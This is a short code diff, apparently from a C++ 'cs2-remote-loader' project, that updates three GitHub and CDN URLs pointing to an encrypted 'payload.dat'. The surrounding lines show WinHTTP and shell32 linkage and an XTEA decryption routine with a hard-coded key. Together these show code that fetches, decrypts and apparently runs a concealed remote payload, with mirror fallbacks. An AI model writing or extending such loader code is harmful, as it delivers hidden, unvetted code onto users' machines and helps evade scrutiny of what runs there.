@@ -6,9 +6,9 @@
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "shell32.lib")
 static const wchar_t* URLS[] = {
-    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/a70553b/payload.dat",
-    L"https://cdn.jsdelivr.net/gh/heruixii/cs2-remote-loader@a70553b/payload.dat",
-    L"https://cdn.statically.io/gh/heruixii/cs2-remote-loader@a70553b/payload.dat",
+    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/fcaaaaa/payload.dat",
+    L"https://cdn.jsdelivr.net/gh/heruixii/cs2-remote-loader@fcaaaaa/payload.dat",
+    L"https://cdn.statically.io/gh/heruixii/cs2-remote-loader@fcaaaaa/payload.dat",
 };
 static constexpr uint32_t XDELTA=0x9E3779B9,XKEY[]={0x7B2E1A4F,0xC9D83560,0x4A1F93E7,0xE8056B2C};
 static void XTEA(uint32_t& v0,uint32_t& v1){uint32_t s=0xC6EF3720;for(int i=0;i<32;i++){v1-=(((v0<<4)^(v0>>5))+v0)^(s+XKEY[(s>>11)&3]);s-=XDELTA;v0-=(((v1<<4)^(v1>>5))+v1)^(s+XKEY[s&3]);}}
